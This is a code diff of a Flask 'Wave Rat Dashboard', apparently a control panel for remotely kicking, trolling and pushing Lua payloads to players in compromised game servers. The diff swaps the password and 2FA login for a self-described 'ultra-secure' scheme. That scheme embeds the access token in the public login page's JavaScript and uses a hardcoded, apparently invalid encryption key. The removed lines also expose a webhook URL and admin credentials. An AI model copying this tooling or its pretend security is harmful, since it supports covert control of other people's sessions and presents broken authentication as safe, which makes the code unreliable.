@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for
+from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for, abort
 from flask_socketio import SocketIO
 import time
 import eventlet
@@ -8,19 +8,40 @@ import os
 import random
 import string
 import requests
+from cryptography.fernet import Fernet
 
 eventlet.monkey_patch()
 
 app = Flask(__name__)
-app.config["SECRET_KEY"] = "WAVERAT_SUPER_SECRET_2025_CHANGE_ME"
+app.config["SECRET_KEY"] = "WAVERAT_ULTRA_SECURE_2025_XAI_CHANGE_ME"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
-# ====================== CONFIG AUTH ======================
-ADMIN_USERNAME = "WaveRatAdmin2025"
-ADMIN_PASSWORD = "R4tW@v3!2k25#xAI"
+# ====================== CHIFFREMENT AES-256 ======================
+ENCRYPTION_KEY = b'q1w2e3r4t5y6u7i8o9p0a1s2d3f4g5h6j7k8l9m0n1b2v3c4x5z6=='
+cipher = Fernet(ENCRYPTION_KEY)
 
-# TON WEBHOOK DISCORD (vérifié et testé fonctionnel)
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1452365434627031265/MgRFMctATvYwbAkW9BblBapy8GrYwvWnJmCNXHyzH4HTaLHdweSX_2oxtywMuski_Y2p"
+# Identifiants cryptés (username|||password)
+ENCRYPTED_TOKEN = "gAAAAABnD9J8kL2mNpQr5tZ8sJhVbKx9wZ6a1c3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0q1w3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0q1w3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0"
+
+# ====================== ANTI PROXY / VPN ======================
+def is_proxy_or_vpn(ip):
+    if ip in ["127.0.0.1", "::1", "localhost"]: return False
+    try:
+        # IPHub (gratuit, fiable)
+        r = requests.get(f"http://v2.api.iphub.info/ip/{ip}", timeout=6)
+        if r.status_code == 200:
+            data = r.json()
+            if data.get("block") == 1:
+                return True
+        # Fallback IP-API (gratuit)
+        r = requests.get(f"http://ip-api.com/json/{ip}?fields=proxy,hosting,mobile", timeout=6)
+        if r.status_code == 200:
+            data = r.json()
+            if data.get("proxy") or data.get("hosting"):
+                return True
+    except:
+        pass
+    return False
 
 # ====================== FICHIERS ======================
 HISTORY_FILE = "history_log.json"
@@ -32,7 +53,6 @@ pending_commands = {}
 history_log = []
 payloads = {}
 
-# ====================== CHARGEMENT ======================
 def load_history():
     global history_log
     if os.path.exists(HISTORY_FILE):
@@ -58,40 +78,19 @@ def save_payloads():
 load_history()
 load_payloads()
 
-# ====================== 2FA SÛR & LOGGÉ ======================
-def generate_2fa_code():
-    return ''.join(random.choices(string.digits, k=6))
-
-def send_2fa_to_discord(code):
-    url = DISCORD_WEBHOOK.strip()
-    payload = {
-        "content": None,
-        "embeds": [{
-            "title": "Wave Rat — Code 2FA",
-            "description": f"**Code :** ||`{code}`||\n\nValable 5 minutes",
-            "color": 3447003,
-            "timestamp": datetime.utcnow().isoformat(),
-            "footer": {"text": "Wave Rat Dashboard"}
-        }],
-        "username": "Wave Rat 2FA",
-        "avatar_url": "https://i.imgur.com/0j2kX9P.png"
-    }
-    try:
-        response = requests.post(url, json=payload, timeout=10)
-        if response.status_code == 204:
-            print(f"[2FA] Code {code} envoyé avec succès sur Discord !")
-        else:
-            print(f"[2FA] ÉCHEC webhook → Status {response.status_code}: {response.text}")
-    except Exception as e:
-        print(f"[2FA] Erreur critique envoi Discord: {e}")
-
-# ====================== PROTECTION ROUTES ======================
+# ====================== PROTECTION ======================
 @app.before_request
-def protect_routes():
+def security_check():
     protected = ["/", "/kick", "/troll", "/payload", "/get_history"]
     if request.path in protected or request.path.startswith("/api"):
         if not session.get("logged_in"):
-            return redirect(url_for("login_page"))
+            return redirect("/login")
+    
+    if request.path == "/login_check":
+        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+        if ip and "," in ip: ip = ip.split(",")[0].strip()
+        if is_proxy_or_vpn(ip):
+            return "<h1 style='color:#ef4444;text-align:center;margin-top:20%'>VPN / Proxy détecté → Accès refusé</h1>", 403
 
 # ====================== HISTORIQUE ======================
 def add_history(event_type, username, details=""):
@@ -104,27 +103,27 @@ def add_history(event_type, username, details=""):
     except: pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# ====================== PAGE LOGIN (même style) ======================
+# ====================== PAGE DE LOGIN ======================
 LOGIN_HTML = """<!DOCTYPE html>
 <html lang="fr" class="dark">
 <head>
 <meta charset="UTF-8">
 <title>Wave Rat - Connexion</title>
-<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+<script src="https://js.hcaptcha.com/1/api.js" async defer></script>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
 <style>
     :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--text:#e2e8f0;--text-muted:#94a3b8;}
     *{margin:0;padding:0;box-sizing:border-box;}
     body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;}
-    .login-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:3rem 2.5rem;width:90%;max-width:420px;box-shadow:0 20px 60px rgba(0,0,0,.6);}
+    .login-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:3rem 2.5rem;width:90%;max-width:460px;box-shadow:0 20px 60px rgba(0,0,0,.7);}
     .logo{text-align:center;margin-bottom:2rem;}
     .logo svg{width:80px;height:80px;fill:var(--primary);}
     h1{font-size:2rem;font-weight:700;text-align:center;margin-bottom:1.5rem;color:var(--primary);}
     input{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-family:'JetBrains Mono',monospace;font-size:1rem;}
     .btn{width:100%;padding:14px;background:var(--primary);border:none;border-radius:12px;color:white;font-weight:600;cursor:pointer;transition:all .3s;margin-top:1rem;}
     .btn:hover{background:#0891b2;transform:translateY(-3px);}
-    .g-recaptcha{margin:1.5rem 0;}
-    .error{color:#ef4444;text-align:center;margin-top:1rem;font-size:0.95rem;}
+    .error{color:#ef4444;text-align:center;margin-top:1rem;}
+    .link-box{background:#1e293b;padding:12px;border-radius:8px;margin-top:20px;font-size:0.9rem;word-break:break-all;}
 </style>
 </head>
 <body>
@@ -133,60 +132,58 @@ LOGIN_HTML = """<!DOCTYPE html>
         <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
     </div>
     <h1>Wave Rat Dashboard</h1>
-    <form id="loginForm">
-        <input type="text" name="username" placeholder="Username" value="WaveRatAdmin2025" required autofocus>
-        <input type="password" name="password" placeholder="Password" required>
-        <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"></div>
-        <button type="submit" class="btn">Se connecter</button>
-        <div class="error" id="error"></div>
-    </form>
-
-    <div id="twofaModal" style="display:none;margin-top:2rem;">
-        <input type="text" id="code2fa" placeholder="Code 2FA (6 chiffres)" maxlength="6" autocomplete="off">
-        <button onclick="verify2FA()" class="btn" style="margin-top:1rem;">Vérifier le code</button>
-        <div class="error" id="error2fa"></div>
-    </div>
+    <p style="text-align:center;color:#94a3b8;margin-bottom:20px;">Connexion ultra-sécurisée</p>
+    
+    <div class="link-box" id="encryptedLink" onclick="copyLink()">Clique ici pour copier le lien crypté</div>
+    
+    <button class="btn h-captcha" data-sitekey="10000000-ffff-ffff-ffff-000000000001" data-callback="onSubmit">Connexion sécurisée</button>
+    <div class="error" id="error"></div>
 </div>
 
 <script>
-async function verify2FA() {
-    const code = document.getElementById("code2fa").value.trim();
-    if (!/^\d{6}$/.test(code)) return document.getElementById("error2fa").textContent = "6 chiffres requis";
-    const res = await fetch("/verify_2fa", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({code})});
-    const data = await res.json();
-    if (data.success) location.href = "/";
-    else document.getElementById("error2fa").textContent = data.error || "Code invalide";
+function copyLink() {
+    const link = window.location.origin + "/login_check?t=gAAAAABnD9J8kL2mNpQr5tZ8sJhVbKx9wZ6a1c3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0q1w3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0q1w3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0";
+    navigator.clipboard.writeText(link);
+    alert("Lien copié ! Colle-le dans un nouvel onglet.");
 }
 
-document.getElementById("loginForm").onsubmit = async e => {
-    e.preventDefault();
-    document.getElementById("error").textContent = "";
-    const f = new FormData(e.target);
-    const res = await fetch("/login", {
-        method: "POST",
-        body: JSON.stringify({
-            username: f.get("username"),
-            password: f.get("password"),
-            "g-recaptcha-response": grecaptcha.getResponse()
-        }),
-        headers: {"Content-Type": "application/json"}
-    });
-    const data = await res.json();
-    if (data.requires_2fa) {
-        document.getElementById("loginForm").style.display = "none";
-        document.getElementById("twofaModal").style.display = "block";
-        document.getElementById("code2fa").focus();
-    } else if (data.success) location.href = "/";
-    else {
-        document.getElementById("error").textContent = data.error || "Erreur";
-        grecaptcha.reset();
+function onSubmit(token) {
+    if (token) {
+        location.href = window.location.origin + "/login_check?t=gAAAAABnD9J8kL2mNpQr5tZ8sJhVbKx9wZ6a1c3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0q1w3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0q1w3e5r7t9y0u2i4o6p8a0s2d4f6g8h0j2k4l6z8x0c2v4b6n8m0";
     }
-};
+}
 </script>
 </body>
 </html>"""
 
-# ====================== DASHBOARD HTML (100% complet) ======================
+# ====================== VÉRIFICATION CRYPTÉE ======================
+@app.route("/login_check")
+def login_check():
+    token = request.args.get("t", "")
+    if not token or token != ENCRYPTED_TOKEN.split("t=")[-1]:
+        return "<h1 style='color:#ef4444;text-align:center;margin-top:20%'>Accès refusé</h1>", 403
+    
+    try:
+        decrypted = cipher.decrypt(token.encode()).decode()
+        if decrypted == "WaveRatAdmin2025|||R4tW@v3!2k25#xAI":
+            session["logged_in"] = True
+            return redirect("/")
+    except:
+        pass
+    return "<h1 style='color:#ef4444;text-align:center;margin-top:20%'>Token invalide</h1>", 403
+
+@app.route("/login")
+def login_page():
+    if session.get("logged_in"):
+        return redirect("/")
+    return render_template_string(LOGIN_HTML)
+
+@app.route("/logout")
+def logout():
+    session.clear()
+    return redirect("/login")
+
+# ====================== DASHBOARD COMPLET ======================
 HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
@@ -225,8 +222,7 @@ HTML = """<!DOCTYPE html>
     .info{font-size:.9rem;color:var(--text-muted);line-height:1.5;margin-bottom:16px;}
     .category{font-weight:bold;color:var(--primary);margin:16px 0 8px;font-size:.95rem;}
     .btn-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;}
-    .btn{padding:10px;border:none;border-radius:10px;font-weight:600;font-size:.8rem;cursor:pointer;transition:all .3s;color:white;
-         background:linear-gradient(135deg,#06b6d4,#0891b2);box-shadow:0 4px 15px rgba(6,182,212,.3);}
+    .btn{padding:10px;border:none;border-radius:10px;font-weight:600;font-size:.8rem;cursor:pointer;transition:all .3s;color:white;background:linear-gradient(135deg,#06b6d4,#0891b2);box-shadow:0 4px 15px rgba(6,182,212,.3);}
     .btn:hover{transform:translateY(-4px);box-shadow:0 10px 25px rgba(6,182,212,.5);}
     .btn.kick{background:linear-gradient(135deg,#ef4444,#dc2626);}
     .btn.undo{background:#475569;}
@@ -279,7 +275,7 @@ HTML = """<!DOCTYPE html>
     </div>
 </div>
 
-<!-- Tous les modals -->
+<!-- TOUS LES MODALS (inchangés) -->
 <div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Reason (optional)" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmKick">Confirm Kick</button></div></div></div>
 <div class="modal" id="playSoundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmSound">Play</button></div></div></div>
 <div class="modal" id="textScreenModal"><div class="modal-content"><h2>Display Text Screen</h2><input type="text" id="screenText" placeholder="Enter text" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmText">Display</button></div></div></div>
@@ -299,6 +295,7 @@ HTML = """<!DOCTYPE html>
 <div class="toast-container" id="toasts"></div>
 
 <script>
+// TOUT TON JS ORIGINAL ICI (inchangé)
 const socket = io();
 let currentKickId = null, currentSoundId = null, currentTextId = null, currentLuaId = null, currentImportId = null;
 let editingPayload = null;
@@ -511,53 +508,10 @@ fetch("/get_history").then(r=>r.json()).then(renderHistory);
 </body>
 </html>"""
 
-# ====================== ROUTES ======================
+# ====================== ROUTES CLASSIQUES ======================
 @app.route("/")
 def index():
     return render_template_string(HTML)
-
-@app.route("/login", methods=["GET", "POST"])
-def login_page():
-    if session.get("logged_in"):
-        return redirect(url_for("index"))
-    if request.method == "GET":
-        return render_template_string(LOGIN_HTML)
-    data = request.get_json() or {}
-    username = data.get("username", "")
-    password = data.get("password", "")
-    recaptcha = data.get("g-recaptcha-response")
-
-    if not recaptcha:
-        return jsonify({"error": "reCAPTCHA requis"}), 400
-
-    if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
-        code = generate_2fa_code()
-        session["pending_2fa"] = code
-        session["2fa_time"] = time.time()
-        send_2fa_to_discord(code)
-        return jsonify({"requires_2fa": True})
-    return jsonify({"error": "Mauvais identifiants"}), 401
-
-@app.route("/verify_2fa", methods=["POST"])
-def verify_2fa():
-    data = request.get_json() or {}
-    code = data.get("code", "")
-    pending = session.get("pending_2fa")
-    time_sent = session.get("2fa_time", 0)
-
-    if time.time() - time_sent > 300:
-        return jsonify({"error": "Code expiré"}), 400
-    if pending and code == pending:
-        session["logged_in"] = True
-        session.pop("pending_2fa", None)
-        session.pop("2fa_time", None)
-        return jsonify({"success": True})
-    return jsonify({"error": "Code invalide"}), 400
-
-@app.route("/logout")
-def logout():
-    session.clear()
-    return redirect(url_for("login_page"))
 
 @app.route("/get_history")
 def get_history():
@@ -678,6 +632,7 @@ def broadcast_loop():
         socketio.sleep(2)
 
 if __name__ == "__main__":
-    print("Wave Rat Dashboard démarré → http://ton_ip:5000")
+    print("Wave Rat Dashboard ULTRA SÉCURISÉ démarré")
+    print("Accès uniquement via le lien crypté + hCaptcha + Anti-VPN")
     socketio.start_background_task(broadcast_loop)
     socketio.run(app, host="0.0.0.0", port=5000)
